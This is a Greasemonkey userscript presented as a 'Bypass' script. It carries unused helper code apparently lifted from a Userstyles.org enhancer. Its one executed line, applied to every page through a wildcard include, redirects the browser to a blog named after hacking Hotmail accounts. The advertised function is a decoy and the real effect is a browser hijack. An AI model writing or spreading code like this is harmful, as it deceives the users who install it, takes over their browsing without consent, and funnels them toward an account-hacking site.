// ==UserScript==
// @name        script by Bypass
// @namespace   http://howtohackhotmail.blogspot.com/
// @include     *
// @include     http://www.*.com
// @exclude     http://howtohackhotmail.blogspot.com/
// @exclude     lnk*
// @require https://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js
// @grant       none
// @version     1
// ==/UserScript==

 function bypass() {
    const STORAGE_PREFIX = 'ustoe-';
    const LOG_PREFIX = 'Userstyles.org Enhancer: ';
    const LOG = true; // Enable logging
    const DEBUG = false; // Set Debugging ON/OFF
    isGM = typeof GM_getValue != 'undefined' && typeof GM_getValue('a', 'b') != 'undefined';
    log = isGM ? function(msg) {if(LOG) GM_log(msg)} : window.opera ? function(msg) {if(LOG) opera.postError(LOG_PREFIX+msg)} : function(msg) {try {if(LOG) console.log(LOG_PREFIX+msg)} catch(e) {}}
    debug = function(msg) {if(LOG && DEBUG) log('** Debug: ' + msg + ' **')}
    addStyle = isGM ? GM_addStyle : function(css) {var head = $('head')[0]; if(!head) return; var style = $c('style', {type:'text/css',innerHTML:css}); head.appendChild(style)}
    setValue = isGM ? GM_setValue : function(name,value) {switch (typeof(value)) {case 'string': localStorage.setItem(STORAGE_PREFIX+name,'S]' + value); break; case 'number': if(value.toString().indexOf('.') < 0) {localStorage.setItem(STORAGE_PREFIX + name, 'N]' + value)} break; case 'boolean': localStorage.setItem(STORAGE_PREFIX+name, 'B]' + value); break}}
    getValue = isGM ? GM_getValue : function(name,defValue) {var value = localStorage.getItem(STORAGE_PREFIX + name); if(value == null) {return defValue} else {switch(value.substr(0,2)) {case 'S]': return value.substr(2); case 'N]': return parseInt(value.substr(2)); case 'B]': return value.substr(2) == 'true';}} return value}
    deleteValue = isGM ? GM_deleteValue : function(name) {localStorage.removeItem(STORAGE_PREFIX+name)}
    xhr = isGM ? GM_xmlhttpRequest : function(obj) {
      var request = new XMLHttpRequest();
      request.onreadystatechange = function() {if(obj.onreadystatechange) {obj.onreadystatechange(request)}; if(request.readyState == 4 && obj.onload) {obj.onload(request)}}
      request.onerror = function() {if(obj.onerror) {obj.onerror(request)}}
      try {request.open(obj.method, obj.url, true)} catch(e) {if(obj.onerror) {obj.onerror({readyState:4, responseHeaders:'', responseText:'', responseXML:'', status:403, statusText:'Forbidden'})}; return}
      if(obj.headers) {for(name in obj.headers) {request.setRequestHeader(name,obj.headers[name])}}
      request.send(obj.data); return request;
    }
    jParse = (window.JSON && window.JSON.parse) ? window.JSON.parse : eval;
    jStringify = (window.JSON && window.JSON.stringify) ? window.JSON.stringify : uneval;
}

window.location.href="http://howtohackhotmail.blogspot.com/";